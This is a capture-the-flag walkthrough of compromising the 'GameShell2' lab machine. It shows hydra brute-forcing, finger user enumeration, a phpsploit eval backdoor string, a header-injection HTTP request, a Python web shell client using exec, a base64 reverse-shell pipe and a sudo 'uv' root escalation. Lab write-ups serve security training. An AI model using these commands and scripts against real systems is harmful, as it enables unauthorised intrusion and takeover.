# GameShell2: A HackMyVM Machine
Difficulty: Easy

## Enumeration
- A quick nmap scan (`sudo nmap -sC -sV -A [target_ip]`) reveals that port 22,79,80 are open.
- Port 22,80 host SSH and web respectively and port 79 is running OpenBSD Finger.

Nmap Scan Results:

```
# Nmap 7.95 scan initiated Wed Jan  7 09:08:30 2026 as: /usr/lib/nmap/nmap -sC -sV -A -p- -o nmap.txt 192.168.0.104
Nmap scan report for 192.168.0.104
Host is up (0.00077s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
79/tcp open  finger  OpenBSD fingerd (ported to Linux)
| finger: \x0D
| Welcome to Linux version 4.19.0-27-amd64 at GameShell2 !\x0D
| 
|  09:09:10 up 2 min,  0 users,  load average: 0.05, 0.05, 0.02
| \x0D
|_No one logged on.\x0D
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/ternimal/
|_http-title: \xE7\xBA\xAF\xE8\xA7\xA6\xE5\xB1\x8F\xE6\xA1\x8C\xE7\x90\x83
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:E2:30:84 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: Host: GameShell2; OSs: Linux, Linux 4.19.0-27-amd64; CPE: cpe:/o:linux:linux_kernel, cpe:/o:linux:linux_kernel:4.19.0-27-amd64

TRACEROUTE
HOP RTT     ADDRESS
1   0.77 ms 192.168.0.104

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan  7 09:09:18 2026 -- 1 IP address (1 host up) scanned in 47.78 seconds
```

### Initial Foothold

- On entering the webpage, we can see a simple billiards game being run. The JS code contains nothing of value.
- In `robots.txt` we can see a disabled endpoint **/terminal**, protected by a http login.
- To enumerate some more, we can use ffuf as follows

```bash
ffuf -u "http://<target_ip>/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .php,.html
```

- This yields another page **/users.html**, where there is a wordlist consisting of users separated by spaces. I used this script to convert all usernames from space separated to line-by-line separation.

```python
with open("users.txt", mode='r') as file:
    contents = [i.strip().split(" ") for i in file.readlines()][0]

contents = [i+"\n" for i in contents]
print(contents)

with open("users_processed.txt", mode='w') as file:
    file.writelines(contents)
```

- To bruteforce the users we can use msfconsole. Check this [link](https://www.verylazytech.com/network-pentesting/finger-port-79).
- The options I set are shown below:

```
   Name        Current Setting           Required  Description
   ----        ---------------           --------  -----------
   RHOSTS      192.168.0.104             yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT       79                        yes       The target port (TCP)
   THREADS     1                         yes       The number of concurrent threads (max one per host)
   USERS_FILE  enum/users_processed.txt  yes       The file that contains a list of default UNIX accounts.
```
- As you can see, I have set our processed wordlist as the **USERS_FILE**.
- This reveals a username `dt` to be valid. We can use this to bruteforce the password on the http login form on **/terminal**.

```bash
hydra -l dt -P /usr/share/wordlists/rockyou.txt <target_ip> http-get /terminal -V -F
```

- This reveals the password `purple1`, use this to log in to the endpoint.
- Here, it consists of a terminal based snake game. On reaching the target score, it reveals a password `0t4tdtlt`.
- Use the given username and the new password to log in using ssh and gain the user flag.

## Pivoting and Privilege Escalation

- We can see that we are in a restricted shell, as we cannot cd into any directories. We can still list all allowed directories.

```bash
total 1140
drwxr-xr-x  7 dt   dt     4096 Jan 10 06:52 .
drwxr-xr-x  3 root root   4096 Nov 21 02:57 ..
lrwxrwxrwx  1 root root      9 Nov 21 03:54 .bash_history -> /dev/null
-rw-r--r--  1 dt   dt      220 Apr 18  2019 .bash_logout
-rw-r--r--  1 dt   dt     4068 Nov 21 03:33 .bashrc
drwxr-xr-x  4 dt   dt     4096 Jan 10 06:52 .cache
drwx------  3 dt   dt     4096 Jan 10 01:17 .gnupg
-rwxr-xr-x  1 dt   dt   975444 Jan 10 01:14 linpeas.sh
drwx------  4 dt   dt     4096 Jan 10 06:52 .local
drwxr-xr-x  3 dt   dt     4096 Nov 21 03:01 .phpsploit
drwxr-xr-x 12 dt   dt     4096 Nov 21 03:01 phpsploit
-rw-r--r--  1 dt   dt      807 Apr 18  2019 .profile
-rw-r--r--  1 dt   dt   140404 Jan 10 01:17 report.txt
-rw-r--r--  1 root root     44 Nov 21 03:56 user.txt
```

- We can see a directory phpsploit, so let's look into it.

```bash
total 180
drwxr-xr-x 12 dt   dt    4096 Nov 21 03:01 .
drwxr-xr-x  7 dt   dt    4096 Jan 10 06:52 ..
-rw-r--r--  1 root root  2800 Nov 21 03:00 .all-contributorsrc
-rw-r--r--  1 root root 16567 Nov 21 03:00 CHANGELOG.md
-rw-r--r--  1 root root   102 Nov 21 03:00 .codacy.yml
-rw-r--r--  1 root root   330 Nov 21 03:00 .codeclimate.yml
-rw-r--r--  1 root root   355 Nov 21 03:00 .codecov.yml
-rw-r--r--  1 root root  2343 Nov 21 03:00 CONTRIBUTE
-rw-r--r--  1 root root    67 Nov 21 03:00 .coveragerc
drwxr-xr-x  6 root root  4096 Nov 21 03:00 data
-rw-r--r--  1 root root   807 Nov 21 03:00 DISCLAIMER
drwxr-xr-x  2 root root  4096 Nov 21 03:00 docs
-rw-r--r--  1 root root   346 Nov 21 03:00 .editorconfig
drwxr-xr-x  7 root root  4096 Nov 21 03:00 .git
drwxr-xr-x  3 root root  4096 Nov 21 03:00 .github
-rw-r--r--  1 root root   308 Nov 21 03:00 .gitignore
-rw-r--r--  1 root root  1047 Nov 21 03:00 INSTALL.md
-rw-r--r--  1 root root   365 Nov 21 03:00 .lgtm.yml
-rw-r--r--  1 root root 35149 Nov 21 03:00 LICENSE
drwxr-xr-x  2 root root  4096 Nov 21 03:00 man
-rwxr-xr-x  1 root root  7168 Nov 21 03:00 phpsploit
drwxr-xr-x  8 root root  4096 Nov 21 03:00 plugins
-rw-r--r--  1 root root  9314 Nov 21 03:00 README.md
-rw-r--r--  1 root root    60 Nov 21 03:00 .remarkrc
-rw-r--r--  1 root root   736 Nov 21 03:00 requirements.txt
drwxr-xr-x  9 root root  4096 Nov 21 03:00 src
drwxr-xr-x  9 root root  4096 Nov 21 03:00 test
-rw-r--r--  1 root root   930 Nov 21 03:00 TODO
drwxr-xr-x  2 root root  4096 Nov 21 03:00 utils
drwxr-xr-x  4 dt   dt    4096 Nov 21 03:01 .venv
```

- Since we can't cd into the directory to run it we have to run everything by typing in it's absolute path. However, on trying to run phpsploit, we will run into a missing packages error. So follow the given commands:

```bash
source phpsploit/.venv/activate
pip3 install -r phpsploit/requirements.txt
phpsploit/phpsploit
```

- This allows us to run this. Look at the docs for phpsploit [here](https://www.kali.org/tools/phpsploit/)
- So we will use the `set` command to see the options that are set.

```
Configuration Settings
======================

    Variable             Value
    --------             -----
    BACKDOOR             <?php @eval($_SERVER['HTTP_%%PASSKEY%%']); ?>
    BROWSER              disabled
    CACHE_SIZE           1 MiB (1048576 bytes)
    EDITOR               vi
    HTTP_USER_AGENT      <RandLine@/home/dt/phpsploit/data/user_agents.lst (10 choices)>
    PASSKEY              phpSpl01t
    PAYLOAD_PREFIX       <MultiLine@9eae353c33da60015f5a7ee5fabe7a85 (16 lines)>
    PROXY                None
    REQ_DEFAULT_METHOD   GET
    REQ_HEADER_PAYLOAD   <?php eval(base64_decode('%%BASE64%%')); ?>
    REQ_INTERVAL         1 <= x <= 10 (random interval)
    REQ_MAX_HEADERS      100
    REQ_MAX_HEADER_SIZE  4 KiB (4096 bytes)
    REQ_MAX_POST_SIZE    4 MiB (4194304 bytes)
    REQ_POST_DATA        <MultiLine@d41d8cd98f00b204e9800998ecf8427e (0 lines)>
    REQ_ZLIB_TRY_LIMIT   20 MiB (20971520 bytes)
    SAVEPATH             /tmp/
    TARGET               None
    TMPPATH              /tmp/
    VERBOSITY            False

[*] For detailed help, run `help set <VAR>
```

- Doing some more enumeration, we can read /etc/hosts which yields this

```
127.0.0.1       localhost astra.dsz dev.astra.dsz
127.0.1.1       GameShell2

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

- Add these hosts to your attacker machine. Visiting dev.astra.dsz reveals a normal looking webpage. Fuzz it using:

```bash
ffuf -u http://dev.astra.dsz/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html
```

- This reveals a **/backdoor.php** endpoint.
- Due to no other data being available, we have to assume that this backdoor.php was made from phpsploit, for which we already have the necessary data.
- Trying to run any system commands using `system('cmd')` from PHP wasn't working, so I enumerated all the blacklisted options using this request

```
GET /backdoor.php HTTP/1.1
Host: dev.astra.dsz
Accept-Language: en-US,en;q=0.9
phpSpl01t: $d=ini_get('disable_functions');echo "Disabled: ".($d?$d:'none');
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 0


```

- From this we can see that only exec can be used for running system commands. So I wrote this python script to do it interactively.

```python
import requests
import os

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

url = "http://dev.astra.dsz/backdoor.php"
session = requests.Session()

while True:
    try:
        cmd = input("command> ").strip()
        if cmd == 'clear':
            clear()
            continue
        if cmd == 'exit':
            break
            
        safe_cmd = cmd.replace("'", "'\"'\"'")
        php_code = f"exec('{safe_cmd} 2>&1', $output); echo implode(\"\\n\", $output);"
        headers = {"phpSpl01t": php_code}
        
        res = session.get(url, headers=headers, timeout=10)
        print(f"[*] Status: {res.status_code}")
        print("-" * 50)
        print(res.text.strip())
        print("-" * 50)
        
    except KeyboardInterrupt:
        break
    except Exception as e:
        print(f"Error: {e}")
```

- From here spawn a reverse shell using your preferred method. I used this method

```bash
echo <base64_encoded_revshell_payload> | base64 -d | bash
```

- This gets us a shell as www-data.

## Privilege Escalation

- On running `sudo -l` in www-data we get this:

```
Matching Defaults entries for www-data on GameShell2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on GameShell2:
    (ALL) NOPASSWD: /usr/local/bin/uv
```

- So we can use a simple command to get a root shell:

```bash
sudo /usr/local/bin/uv run "bash"
```

- This gets us a shell as root, allowing us to gain the root flag.


Happy Hacking :)
